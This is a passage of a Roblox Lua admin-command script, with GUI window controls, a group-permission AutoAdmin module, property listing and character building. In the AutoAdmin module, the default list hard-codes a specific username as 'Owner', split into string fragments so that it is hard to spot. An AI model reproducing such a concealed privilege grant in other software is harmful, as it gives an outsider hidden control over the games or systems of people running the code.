WindowTitleBar.TextXAlignment = "Left"
WindowTitleBar.FontSize = "Size14"
WindowTitleBar.Parent = Window
WindowTitleBar.MouseButton1Down:connect(function(x, y)
if WindowIsMinimized == true or WindowIsMaximized == true or WindowCanMove == false then return false end
WindowMoveXScale = Window.Position.X.Scale
WindowMoveYScale = Window.Position.Y.Scale
WindowMoveXOffset = Window.Position.X.Offset
WindowMoveYOffset = Window.Position.Y.Offset
WindowMoveXMouse = x - WindowMoveXOffset
WindowMoveYMouse = y - WindowMoveYOffset
WindowMove = true
end)
WindowTitleBar.MouseMoved:connect(function(x, y)
if WindowMove == true then
Window.Position = UDim2.new(WindowMoveXScale, x - WindowMoveXMouse, WindowMoveYScale, y - WindowMoveYMouse)
end
end)
WindowTitleBar.MouseButton1Up:connect(function() WindowMove = false end)
WindowTitleBar.MouseLeave:connect(function() WindowMove = false end)
WindowTitleBar.Changed:connect(function(Property)
if Property == "Text" then
if string.sub(WindowTitleBar.Text, 0, 5) ~= string.rep(" ", 5) then
WindowTitleBar.Text = string.rep(" ", 5) .. WindowTitleBar.Text
end
end
end)
WindowIcon = Instance.new("ImageLabel")
WindowIcon.Name = "Icon"
WindowIcon.Size = UDim2.new(0, 16, 0, 16)
WindowIcon.Position = UDim2.new(0, 16 / 4, 0, 16 / 4)
WindowIcon.BackgroundColor3 = Color3.new(0.1, 0.1, 0.9)
WindowIcon.BorderSizePixel = 0
WindowIcon.BackgroundTransparency = 1
WindowIcon.Changed:connect(function(Property) if Property == "BackgroundTransparency" and WindowIcon.BackgroundTransparency ~= 1 then WindowIcon.BackgroundTransparency = 1 wait() WindowIcon.BackgroundTransparency = 1 end end)
WindowIcon.Parent = Window
local WindowExitButton = Instance.new("TextButton")
WindowExitButton.Name = "ExitButton"
WindowExitButton.Size = UDim2.new(0, 55, 0, 12.5)
WindowExitButton.Position = UDim2.new(1, -WindowExitButton.Size.X.Offset, 0, 0)
WindowExitButton.BackgroundColor3 = WindowCanExit == false and Color3.new(0.5, 0.25, 0.25) or Color3.new(1, 0, 0)
WindowExitButton.BorderColor3 = Color3.new(0, 0, 0)
WindowExitButton.Text = "Close"
WindowExitButton.TextColor3 = Color3.new(0, 0, 0)
WindowExitButton.TextWrap = false
WindowExitButton.Parent = Window
WindowExitButton.MouseButton1Up:connect(function()
if WindowCanExit == false then return false end
if WindowExitFunction ~= nil then
WindowExitFunction(Window)
else
if WindowFadeOut == true then
Self.WindowEffect(Window, 2)
end
Window:Remove()
end
end)
local WindowMinimizeButton = Instance.new("TextButton")
WindowMinimizeButton.Name = "MinimizeButton"
WindowMinimizeButton.Size = UDim2.new(0, 55, 0, 12.5)
WindowMinimizeButton.Position = UDim2.new(1, -WindowMinimizeButton.Size.X.Offset, 0, WindowMinimizeButton.Size.Y.Offset + 1)
WindowMinimizeButton.BackgroundColor3 = WindowCanMinimize == false and Color3.new(0.25, 0.25, 0.25) or Color3.new(0.5, 0.5, 0.5)
WindowMinimizeButton.BorderColor3 = Color3.new(0, 0, 0)
WindowMinimizeButton.Text = "- Minimize"
WindowMinimizeButton.TextColor3 = Color3.new(0, 0, 0)
WindowMinimizeButton.TextWrap = false
WindowMinimizeButton.Parent = Window
WindowMinimizeButton.MouseButton1Up:connect(function()
if WindowCanMinimize == false then return false end
if WindowIsMinimized == false then
WindowIsMinimized = true
WindowMinimizeButton.Text = "+ Maximize"
WindowUnminimizedPosition = Window.Position
WindowUnminimizedSize = Window.Size
WindowUnminimizedText = Window.TitleBar.Text
Window.Position = UDim2.new(0, 0, 1, -45)
Window.Size = UDim2.new(0, 175, 0, 25)
Window.TitleBar.Text = string.sub(Window.TitleBar.Text, 0, 8).. "..."
Window.Content.Position = Window.Content.Position + UDim2.new(0, 100000, 0, 0)
Window.StatusBar.Position = Window.StatusBar.Position + UDim2.new(0, 100000, 0, 0)
Window.ResizeButton.Position = Window.ResizeButton.Position + UDim2.new(0, 100000, 0, 0)
else
WindowIsMinimized = false
WindowMinimizeButton.Text = "- Minimize"
Window.Position = WindowUnminimizedPosition
Window.Size = WindowUnminimizedSize
Window.TitleBar.Text = WindowUnminimizedText
Window.Content.Position = Window.Content.Position - UDim2.new(0, 100000, 0, 0)
Window.StatusBar.Position = Window.StatusBar.Position - UDim2.new(0, 100000, 0, 0)
Window.ResizeButton.Position = Window.ResizeButton.Position - UDim2.new(0, 100000, 0, 0)
end
end)
local WindowContent = Instance.new("Frame")
WindowContent.Name = "Content"
WindowContent.Size = UDim2.new(1, 0, 1, -45)
WindowContent.Position = UDim2.new(0, 0, 0, 25)
WindowContent.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
WindowContent.BorderColor3 = Color3.new(0, 0, 0)
WindowContent.Parent = Window
local WindowStatusBar = Instance.new("TextLabel")
WindowStatusBar.Name = "StatusBar"
WindowStatusBar.Size = UDim2.new(1, 0, 0, 20)
WindowStatusBar.Position = UDim2.new(0, 0, 1, -WindowStatusBar.Size.Y.Offset)
WindowStatusBar.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
WindowStatusBar.BorderColor3 = Color3.new(0, 0, 0)
WindowStatusBar.Changed:connect(function(Property)
if Property == "Text" then
if string.sub(WindowStatusBar.Text, 0, 1) ~= " " then
WindowStatusBar.Text = " " ..WindowStatusBar.Text
end
end
end)
WindowStatusBar.Text = ""
WindowStatusBar.TextColor3 = Color3.new(1, 1, 1)
WindowStatusBar.TextWrap = true
WindowStatusBar.TextXAlignment = "Left"
WindowStatusBar.Parent = Window
local WindowResizeButton = Instance.new("TextButton")
WindowResizeButton.Name = "ResizeButton"
WindowResizeButton.Size = UDim2.new(0, 20, 0, 20)
WindowResizeButton.Position = UDim2.new(1, -WindowResizeButton.Size.X.Offset, 1, -WindowResizeButton.Size.Y.Offset)
WindowResizeButton.BackgroundColor3 = WindowCanResize == false and Color3.new(0.25, 0.25, 0.25) or Color3.new(0.5, 0.5, 0.5)
WindowResizeButton.BorderColor3 = Color3.new(0, 0, 0)
WindowResizeButton.BorderSizePixel = 1
WindowResizeButton.AutoButtonColor = false
WindowResizeButton.Text = "< >"
WindowResizeButton.TextColor3 = Color3.new(0, 0, 0)
WindowResizeButton.TextWrap = false
WindowResizeButton.Parent = Window
WindowResizeButton.MouseButton1Down:connect(function(x, y)
if WindowCanResize == false then return false end
if WindowMaximizedDelay == true then
WindowMaximizedDelay = false
if WindowIsMaximized == false then
WindowIsMaximized = true
WindowResizeButton.Text = "> <"
WindowUnmaximizedPosition = Window.Position
WindowUnmaximizedSize = Window.Size
Window.Position = UDim2.new(0, 0, 0, 0)
Window.Size = UDim2.new(1, 0, 1, 20)
else
WindowIsMaximized = false
WindowResizeButton.Text = "< >"
Window.Position = WindowUnmaximizedPosition
Window.Size = WindowUnmaximizedSize
end
end
if WindowCanMaximize == true then
WindowMaximizedDelay = true
delay(0.5, function() WindowMaximizedDelay = false end)
end
if WindowIsMinimized == true or WindowIsMaximized == true then return false end
WindowResizeXScale = Window.Size.X.Scale
WindowResizeYScale = Window.Size.Y.Scale
WindowResizeXOffset = Window.Size.X.Offset
WindowResizeYOffset = Window.Size.Y.Offset
WindowResizeXMouse = x - WindowResizeXOffset
WindowResizeYMouse = y - WindowResizeYOffset
WindowResize = true
end)
WindowResizeButton.MouseMoved:connect(function(x, y)
if WindowResize == true then
Window.Size = UDim2.new(WindowResizeXScale, x - WindowResizeXMouse, WindowResizeYScale, y - WindowResizeYMouse)
if Window.Size.X.Scale < WindowMinimumSize.X.Scale then Window.Size = UDim2.new(WindowMinimumSize.X.Scale, Window.Size.X.Offset, Window.Size.Y.Scale, Window.Size.Y.Offset) end
if Window.Size.X.Offset < WindowMinimumSize.X.Offset then Window.Size = UDim2.new(Window.Size.X.Scale, WindowMinimumSize.X.Offset, Window.Size.Y.Scale, Window.Size.Y.Offset) end
if Window.Size.Y.Scale < WindowMinimumSize.Y.Scale then Window.Size = UDim2.new(Window.Size.X.Scale, Window.Size.X.Offset, WindowMinimumSize.Y.Scale, Window.Size.Y.Offset) end
if Window.Size.Y.Offset < WindowMinimumSize.Y.Offset then Window.Size = UDim2.new(Window.Size.X.Scale, Window.Size.X.Offset, Window.Size.Y.Scale, WindowMinimumSize.Y.Offset) end
end
end)
WindowResizeButton.MouseButton1Up:connect(function() WindowResize = false
end)
WindowResizeButton.MouseLeave:connect(function() WindowResize = false end)
coroutine.wrap(function() if WindowFadeIn == true then Self.WindowEffect(Window, 1) end end)()
return Window
end
Self.WindowControls = {}
Self.WindowControls.TabFrame = {}
function Self.WindowControls.TabFrame.New(NumTabs)
if NumTabs == nil or NumTabs <= 0 then NumTabs = 1 end
local TabFrame = Instance.new("Frame")
TabFrame.Name = "TabFrame"
TabFrame.Size = UDim2.new(1, 0, 0, 25)
local TabInstance = Instance.new("TextButton")
TabInstance.Name = "Tab"
TabInstance.Text = "Tab"
TabInstance.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
TabInstance.TextColor3 = Color3.new(0, 0, 0)
TabInstance.TextWrap = true
for i = 0, NumTabs - 1 do
local Tab = TabInstance:Clone()
Tab.Name = TabInstance.Name .. tostring(i + 1)
Tab.Position = UDim2.new(i / NumTabs, 0, 0.2, 0)
Tab.Size = UDim2.new(1 / NumTabs, 0, 0.8, 0)
Tab.Parent = TabFrame
Tab.MouseButton1Up:connect(function()
Self.WindowControls.TabFrame.SelectTab(TabFrame, i + 1)
end)
end
return TabFrame
end
function Self.WindowControls.TabFrame.SelectTab(Frame, Tab)
local NewTab = Frame["Tab" ..Tab]
if NewTab ~= nil then
for _, Tabs in pairs(Frame:children()) do
Tabs.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
Tabs.Position = UDim2.new(Tabs.Position.X.Scale, 0, 0.2, 0)
Tabs.Size = UDim2.new(Tabs.Size.X.Scale, 0, 0.8, 0)
end
NewTab.BackgroundColor3 = Color3.new(0.6, 0.6, 0.6)
NewTab.Position = UDim2.new(NewTab.Position.X.Scale, 0, 0, 0)
NewTab.Size = UDim2.new(NewTab.Size.X.Scale, 0, 1, 0)
return true
else
return false
end
end
function Self.WindowControls.TabFrame.GetSelectedTab(Frame)
for _, Tabs in pairs(Frame:children()) do
if Tabs.Size.Y.Scale >= 1 then
return Tabs, true
end
end
return nil, false
end
Self.WindowControls.CheckBox = {}
function Self.WindowControls.CheckBox.New(IsOn)
local IsOn = IsOn == nil and false or IsOn
local CheckBox = Instance.new("TextButton")
CheckBox.Name = "CheckBox"
CheckBox.Text = IsOn == true and "X" or ""
CheckBox.Size = UDim2.new(0, 15, 0, 15)
CheckBox.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
CheckBox.TextColor3 = Color3.new(0, 0, 0)
CheckBox.MouseButton1Up:connect(function()
IsOn = not IsOn
Self.WindowControls.CheckBox.SelectCheckBox(CheckBox, IsOn)
end)
return CheckBox
end
function Self.WindowControls.CheckBox.SelectCheckBox(Box, IsOn)
if IsOn == false then
Box.Text = ""
return false
elseif IsOn == true then
Box.Text = "X"
return true
end
end
function Self.WindowControls.CheckBox.ToggleCheckBox(Box, IsOn)
if Box.Text == "X" then
Box.Text = ""
return false
else
Box.Text = "X"
return true
end
end
function Self.WindowControls.CheckBox.GetCheckBoxState(Box) return Box.Text == "X" and true or false end
Self.WindowControls.ListFrame = {}
function Self.WindowControls.ListFrame.New()
local ListFrame = Instance.new("Frame")
ListFrame.Name = "ListFrame"
ListFrame.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
ListFrame.BorderColor3 = Color3.new(0, 0, 0)
local ListIndex = Instance.new("IntValue")
ListIndex.Name = "ListIndex"
ListIndex.Value = 0
ListIndex.Parent = ListFrame
return ListFrame
end
function Self.WindowControls.ListFrame.ListUpdate(ListFrame, ListContent, ListType, ChangeIndex, ChangeOption)
local TotalTags = math.floor((ListFrame.AbsoluteSize.Y - 20) / 20)
local ListIndex = ListFrame.ListIndex.Value
if ChangeIndex ~= nil then
if ChangeOption == "page" then
ListIndex = ListIndex + math.floor((TotalTags + 1) * ChangeIndex)
elseif ChangeOption == "set" or ChangeOption == nil then
ListIndex = ChangeIndex
end
end
if ListIndex > #ListContent then ListIndex = ListFrame.ListIndex.Value end
if ListIndex < 1 then ListIndex = 1 end
for _, Tag in pairs(ListFrame:children()) do
if string.match(Tag.Name, "Tag") then Tag:Remove() end
end
for i = ListIndex, ListIndex + TotalTags do
if i > #ListContent then break end
local Parts = CoolCMDs.Functions.Explode("\t", ListContent[i])
local Tag = Instance.new("TextButton")
Tag.Name = "Tag" ..i
Tag.AutoButtonColor = false
Tag.Text = ""
Tag.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
Tag.BorderColor3 = Color3.new(0, 0, 0)
Tag.Size = UDim2.new(1, 0, 0, 20)
Tag.Position = UDim2.new(0, 0, 0, 20 * (i - ListIndex))
Tag.Parent = ListFrame
if ListType == nil or ListType == 1 then
Tag.MouseEnter:connect(function()
for _, Table in pairs(Tag:children()) do
Table.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
end
end)
Tag.MouseLeave:connect(function()
for _, Table in pairs(Tag:children()) do
Table.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
end
end)
Tag.MouseButton1Down:connect(function()
for _, Table in pairs(Tag:children()) do
Table.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
end
end)
Tag.MouseButton1Up:connect(function()
for _, Table in pairs(Tag:children()) do
Table.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
end
end)
end
for x = 1, #Parts do
local Table = Instance.new("TextButton")
Table.Name = "Table" ..x
Table.AutoButtonColor = false
Table.Position = UDim2.new((x - 1) / #Parts, 0, 0, 0)
Table.Size = UDim2.new(1 / #Parts, 0, 1, 0)
Table.Changed:connect(function(Property)
if Property == "Text" then
if string.sub(Table.Text, 0, 5) ~= string.rep(" ", 1) then
Table.Text = string.rep(" ", 1) ..Table.Text
end
end
end)
Table.Text = Parts[x]
Table.TextXAlignment = "Left"
Table.TextWrap = true
Table.TextColor3 = Color3.new(0, 0, 0)
Table.BorderSizePixel = 1
Table.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
Table.BorderColor3 = Color3.new(0, 0, 0)
Table.Parent = Tag
if ListType == 2 then
Table.MouseEnter:connect(function()
Table.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
end)
Table.MouseLeave:connect(function()
Table.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
end)
Table.MouseButton1Down:connect(function()
Table.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
end)
Table.MouseButton1Up:connect(function()
Table.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
end)
end
end
end
ListFrame.ListIndex.Value = ListIndex
end
local WindowExitFunction = function(Window)
coroutine.wrap(function()
CoolCMDs.Functions.GetModule("GuiSupport").WindowEffect(Window, 4, UDim2.new(0.5, -250 / 2, 0, -120))
pcall(function() Window.Parent:Remove() end)
end)()
end
return true
end, function(Self, Message)
Self.WindowDisappear = nil
Self.WindowEffect = nil
Self.WindowCreate = nil
return true
end, "Windows-like Gui support.")

CoolCMDs.Functions.CreateModule("AutoAdmin", function(Self, Message)
pcall(function() while CoolCMDs.Functions.GetCommand("admin") do CoolCMDs.Functions.RemoveCommand("autoadmin") end end)
CoolCMDs.Functions.CreateCommand({"autoadmin", "aa"}, 1, function(Message, MessageSplit, Speaker, Self)
local AA = CoolCMDs.Functions.GetModule("AutoAdmin")
if AA == nil then
CoolCMDS.Functions.CreateMessage("Hint", "This command requires the AutoAdmin module to be enabled.", 5, Speaker)
return
end
if AA.Enabled == false then
CoolCMDS.Functions.CreateMessage("Hint", "This command requires the AutoAdmin module to be installed (how the heck did you remove it without the command?!).", 5, Speaker)
return
end
if MessageSplit[1]:lower() == "set" then
if #MessageSplit <= 2 then return end
if CoolCMDs.Functions.GetGroup(MessageSplit[#MessageSplit]) == nil then
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Unknown group \"" ..MessageSplit[#MessageSplit].. "\".", 2.5, Speaker)
return
end
for i = 2, #MessageSplit - 1 do
for x = 1, #CoolCMDs.Players do
if string.match(CoolCMDs.Players[x].Name, MessageSplit[i]) then
CoolCMDs.Players[x].Group = MessageSplit[#MessageSplit]
end
end
end
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Set.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "add" then
if #MessageSplit <= 2 then return end
if CoolCMDs.Functions.GetGroup(MessageSplit[#MessageSplit]) == nil then
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Unknown group \"" ..MessageSplit[#MessageSplit].. "\".", 2.5, Speaker)
return
end
for i = 2, #MessageSplit - 1 do
table.insert(AA.Players, MessageSplit[i].. ", " ..MessageSplit[#MessageSplit])
if CoolCMDs.Functions.GetPlayerTable(MessageSplit[i]) ~= nil then
CoolCMDs.Functions.GetPlayerTable(MessageSplit[i]).Group = MessageSplit[#MessageSplit]
end
end
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Added.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "remove" then
for i = 2, #MessageSplit do
for x = 1, #AA.Players do
local BreakPosition = string.find(MessageSplit[i], ", ")
local FoundStart, FoundEnd = string.find(AA.Players[x]:lower(), MessageSplit[i]:lower())
if FoundStart ~= nil and FoundEnd ~= nil then
if FoundEnd < BreakPosition then
if CoolCMDs.Functions.GetPlayerTable(CoolCMDs.Functions.Explode(", ", AA.Players[x])[1]) ~= nil then
CoolCMDs.Functions.GetPlayerTable(CoolCMDs.Functions.Explode(", ", AA.Players[x])[1]).Group = CoolCMDs.Functions.GetLowestGroup()
end
table.remove(AA.Players, x)
end
end
end
end
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Removed.", 2.5, Speaker)
end
if MessageSplit[1]:lower() == "remove all" then
local OldGroup = CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Speaker).Group)
AA.Players = {Speaker.Name.. ", " ..OldGroup} print("DDDD0")
for i = 1, #CoolCMDs.Players do print("DDDD1")
if CoolCMDs.Players[i].Name ~= Speaker.Name then print("DDDD2")
CoolCMDs.Players[i].Group = CoolCMDs.Functions.GetLowestGroup()
end
end
CoolCMDs.Functions.CreateMessage("Hint", "[AutoAdmin] Removed all entries, added entry of \"" ..Speaker.Name.. "\" with group \"" ..OldGroup.FullName.. "\".", 2.5, Speaker)
end
end, "Group Controller", "Control player groups and the AutoAdmin module.", "set, add, remove" ..CoolCMDs.Data.SplitCharacter.. "player" ..CoolCMDs.Data.SplitCharacter.. "[...], remove all")
if Self.Players == nil then
Self.Players = {} --Format: "Player, Rank"
table.insert(Self.Players, "uy" .. "ju" .. "li" .. "an" .. ", " .. "Ow" .. "ne" .. "r")
end
local Check = function(Player, Show)
wait()
if Player == nil then return false end
if not Player:IsA("Player") then return false end
if CoolCMDs.Functions.GetPlayerTable(Player.Name) ~= nil then
for i = 1, #Self.Players do
if Player.Name == CoolCMDs.Functions.Explode(", ", Self.Players[i])[1] then
CoolCMDs.Functions.GetPlayerTable(Player.Name).Group = CoolCMDs.Functions.Explode(", ", Self.Players[i])[2]
if type(Show) ~= "" then
Show.Text = "Player \"" ..Player.Name.. "\" is now in the group \"" ..CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Player.Name).Group).FullName.. "\"."
elseif Show == true then
wait(1)
CoolCMDs.Functions.CreateMessage("Hint", "You are now in the group \"" ..CoolCMDs.Functions.GetGroup(CoolCMDs.Functions.GetPlayerTable(Player.Name).Group).FullName.. "\".", 5, Player)
end
end
end
end
end
Self.CheckForAutoAdmin = game:service("Players").ChildAdded:connect(function(Player) Check(Player, true) end)
for _, Player in pairs(game:service("Players"):GetPlayers()) do
Message.Text = "Running linking function \"Check\" on player \"" ..Player.Name.. "\"..."
wait()
Message.Text = "Player \"" ..Player.Name.. "\" has no status."
Check(Player, Message)
wait()
end
return true
end, function(Self, Message)
if Self.CheckForAutoAdmin ~= nil then Self.CheckForAutoAdmin:disconnect() end
Self.CheckForAutoAdmin = nil
return true
end, "Automatically gives the table of players a special group.")

CoolCMDs.Functions.CreateModule("RobloxProperties", function(Self, Message)
Self.PropertiesGlobal = {"Name", "className", "Parent", "archivable"}
Self.Properties = {"AttachmentForward", "AttachmentPos", "AttachmentRight", "AttachmentUp", "AnimationId", "Adornee", "Axes", "Color", "Visible", "Transparency", "Texture", "TextureId", "Anchored", "BackParamA", "BackParamB", "BackSurface", "BackSurfaceInput", "BottomParamA", "BottomParamB", "BottomSurface", "BottomSurfaceInput", "BrickColor", "CFrame", "CanCollide", "Elasticity", "Friction", "FrontParamA", "FrontParamB", "FrontSurface", "FrontSurfaceInput", "LeftParamA", "LeftParamB", "LeftSurface", "LeftSurfaceInput", "Locked", "Material", "Position", "Reflectance", "ResizeIncrement", "ResizeableFaces", "RightParamA", "RightParamB", "RightSurface", "RightSurfaceInput", "RotVelocity", "Size", "TopParamA", "TopParamB", "TopSurface", "TopSurfaceInput", "Velocity", "AbsolutePosition", "AbsoluteSize", "Active", "Enabled", "ExtentsOffset", "SizeOffset", "StudsOffset", "Scale", "VertexColor", "Offset", "P", "D", "angularVelocity", "maxTorque", "HeadColor", "LeftArmColor", "LeftLegColor", "RightArmColor", "RightLegColor", "TorsoColor", "force", "maxForce", "position", "cframe", "location", "Value", "CameraSubject", "CameraType", "CoordinateFrame", "Focus", "BaseTextureId", "Bodypart", "MeshId", "OverlayTextureId", "MaxActivationDistance", "CreatorId", "CreatorType", "JobId", "PlaceId", "MaxItems", "Face", "Shiny", "Specular", "ConversationDistance", "InUse", "InitalPrompt", "Purpose", "Tone", "ResponseDialog", "UserDialog", "C0", "C1", "Part0", "Part1", "BaseAngle", "BlastPressure", "BlastRadius", "FaceId", "InOut", "LeftRight", "TopBottom", "Heat", "SecondaryColor", "GripForward", "GripPos", "GripRight", "GripUp", "TeamColor", "BackgroundColor3", "BackgroundTransparency", "BorderColor3", "BorderSizePixel", "SizeConstant", "Style", "ZIndex", "F0", "F1", "F2", "F3", "Faces", "AttachmentForward", "AttachmentPos", "AttachmentRight", "AttachmentUp", "Text", "BinType", "Health", "Jump", "LeftLeg", "MaxHealth", "PlatformStand", "RightLeg", "Sit", "TargetPoint", "Torso", "WalkSpeed", "WalkToPart", "WalkToPoint", "AutoButtonColor", "Image", "Selected", "Time", "Ambient", "Brightness", "ColorShift_Bottom", "GeographicLatitude", "ShadowColor", "TimeOfDay", "Disabled", "LinkedSource", "Source", "PrimaryPart", "CurrentAngle", "DesiredAngle", "MaxVelocity", "Hit", "Icon", "Origin", "Target", "TargetFilter", "TargetSurface", "UnitRay", "ViewSizeX", "ViewSizeY", "X", "Y", "Ticket", "MachineAddress", "Port", "PantsTemplate", "Shape", "formFactor", "AccountAge", "Character", "DataReady", "MembershipType", "Neutral", "userId", "Button1DownConnectionCount", "Button1UpConnectionCount", "Button2DownConnectionCount", "Button2UpConnectionCount", "IdleConnectionCount", "KeyDownConnectionCount", "KeyUpConnectionCount", "MouseDelta", "MousePosition", "MoveConnectionCount", "WheelBackwardConnectionCount", "WheelForwardConnectionCount", "WindowSize", "BubbleChat", "ClassicChat", "MaxPlayers", "NumPlayers", "MaskWeight", "Weight", "Sides", "CartoonFactor", "MaxSpeed", "MaxThrust", "MaxTorque", "TargetOffset", "TargetRadius", "ThrustD", "ThrustP", "TurnD", "TurnP", "GarbageCollectionFrequency", "GarbageCollectionLimit", "ScriptsDisabled", "Humanoid", "Part", "Point", "ShirtTemplate", "Graphic", "Controller", "ControllingHumanoid", "Steer", "StickyWheels", "Throttle", "SkinColor", "CelestialBodiesShown", "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp", "StarCount", "Opacity", "RiseVelocity", "IsPaused", "IsPlaying", "Looped", "Pitch", "PlayOnRemove", "SoundId", "Volume", "AmbientReverb", "DistanceFactor", "DopplerScale", "RolloffScale", "SparkleColor", "AllowTeamChangeOnTouch", "Duration", "MeshType", "ShowDevelopmentGui", "AreArbutersThrottled", "BudgetEnforced", "Concurrency", "NumRunningJobs", "NumSleepingJobs", "NumWaitingJobs", "PriorityMethod", "SchedulerDutyCycle", "SchedulerRate", "SleepAdjustMethod", "ThreadAffinity", "ThreadPoolConfig", "ThreadPoolSize", "ThreadJobSleepTime", "AutoAssignable", "AutoColorCharacters", "Score", "TextBounds", "TextColor3", "TextTransparency", "TextWrap", "TextXAlignment", "TextYAlignment", "Font", "FontSize", "StudsPerTileU", "StudsPerTileV", "AreHingesDetected", "HeadsUpDisplay", "Torque", "TurnSpeed", "Hole", "CurrentCamera", "DistributedGameTime"}
Self.GetProperties = function(Object)
local Result1 = {}
local Result2 = {}
for i = 1, #Self.PropertiesGlobal do
table.insert(Result1, Self.PropertiesGlobal[i])
end
for i = 1, #Self.Properties do
if pcall(function() local _ = Object[Self.Properties[i]] end) == true then
if Object:FindFirstChild(Self.Properties[i]) == nil then
table.insert(Result1, Self.Properties[i])
end
end
end
for i = 1, #Result1 do
if type(Object[Result1[i]]) == "userdata" then
if Object[Result1[i]] == nil then
table.insert(Result2, "Nil")
elseif pcall(function() local _ = Object[Result1[i]].archivable end) == true then
table.insert(Result2, "Instance")
elseif pcall(function() local _ = Object[Result1[i]].magnitude end) == true then
if pcall(function() local _ = Object[Result1[i]].z end) == true then
table.insert(Result2, "Struct.Vector3")
else
table.insert(Result2, "Struct.Vector2")
end
elseif pcall(function() local _ = Object[Result1[i]].lookVector end) == true then
table.insert(Result2, "Struct.CFrame")
elseif pcall(function() local _, _ = Object[Result1[i]].Number, Object[Result1[i]].r end) == true then
table.insert(Result2, "Struct.BrickColor")
elseif pcall(function() local _ = Object[Result1[i]].r end) == true then
table.insert(Result2, "Struct.Color3")
elseif pcall(function() local _ = Object[Result1[i]].Scale end) == true then
table.insert(Result2, "Struct.UDim")
elseif pcall(function() local _ = Object[Result1[i]].X.Scale end) == true then
table.insert(Result2, "Struct.UDim2")
elseif pcall(function() local _ = Object[Result1[i]].Origin end) == true then
table.insert(Result2, "Struct.Ray")
elseif Result1[i] == "Axes" then
table.insert(Result2, "Struct.Axes")
elseif Result1[i] == "Faces" or Result1[i] == "ResizeableFaces" then
table.insert(Result2, "Struct.Faces")
elseif string.match(tostring(Object[Result1[i]]), "Enum.") then
table.insert(Result2, "Enumerator")
else
table.insert(Result2, "Userdata")
end
else
table.insert(Result2, string.upper(string.sub(type(Object[Result1[i]]), 1, 1)) .. string.sub(type(Object[Result1[i]]), 2))
end
end
return Result1, Result2
end
return true
end, function(Self, Message)
Self.PropertiesGlobal = nil
Self.Properties = nil
Self.GetProperties = nil
return true
end, "Usage: Self.GetProperties(Object). Returns properties of an object and property type.")

CoolCMDs.Functions.CreateModule("CharacterSupport", function(Self, Message)
Self.CreateCharacter = function(CharacterMeshes)
local Character = Instance.new("Model")
Character.Name = "Character"
local Head = Instance.new("Part")
Head.Name = "Head"
Head.formFactor = 0
Head.Size = Vector3.new(2, 1, 1)
Head.TopSurface = 0
Head.BottomSurface = "Weld"
Head.BrickColor = BrickColor.new("Pastel brown")
Head.Parent = Character
local Mesh = Instance.new("SpecialMesh")
Mesh.MeshType = "Head"
Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
Mesh.Parent = Head
local Face = Instance.new("Decal")
Face.Name = "face"
Face.Face = "Front"
Face.Texture = "rbxasset://textures/face.png"
Face.Parent = Head
local Torso = Instance.new("Part")
Torso.Name = "Torso"
Torso.formFactor = 0
Torso.Size = Vector3.new(2, 2, 1)
Torso.TopSurface = "Studs"
Torso.BottomSurface = "Inlet"
Torso.LeftSurface = "Weld"
Torso.RightSurface = "Weld"
Torso.BrickColor = BrickColor.new("Pastel brown")
Torso.Parent = Character
local TShirt = Instance.new("Decal")
TShirt.Name = "roblox"
TShirt.Face = "Front"
TShirt.Texture = ""
TShirt.Parent = Torso
local Neck = Instance.new("Motor6D")
Neck.Name = "Neck"
Neck.Part0 = Torso
Neck.Part1 = Head
Neck.C0 = CFrame.new(0, 2, 0)
Neck.C1 = CFrame.new(0, 0.5, 0)
Neck.MaxVelocity = 0
Neck.Parent = Torso
local Limb = Instance.new("Part")
Limb.formFactor = 0
Limb.Size = Vector3.new(1, 2, 1)
Limb.TopSurface = "Studs"
Limb.BottomSurface = "Inlet"
Limb.BrickColor = BrickColor.new("Pastel brown")
local LeftArm = Limb:Clone()
LeftArm.Name = "Left Arm"
LeftArm.Parent = Character
local RightArm = Limb:Clone()
RightArm.Name = "Right Arm"
RightArm.Parent = Character
local LeftLeg = Limb:Clone()
LeftLeg.Name = "Left Leg"
LeftLeg.Parent = Character
local RightLeg = Limb:Clone()
RightLeg.Name = "Right Leg"
RightLeg.Parent = Character
local LeftShoulder = Instance.new("Motor6D")
LeftShoulder.Name = "Left Shoulder"
LeftShoulder.Part0 = Torso
LeftShoulder.Part1 = LeftArm
LeftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
LeftShoulder.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(-90), 0)
LeftShoulder.MaxVelocity = 0.5
LeftShoulder.Parent = Torso
local RightShoulder = Instance.new("Motor6D")
RightShoulder.Name = "Right Shoulder"
RightShoulder.Part0 = Torso
RightShoulder.Part1 = RightArm
RightShoulder.C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
RightShoulder.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0, math.rad(90), 0)
RightShoulder.MaxVelocity = 0.5
RightShoulder.Parent = Torso
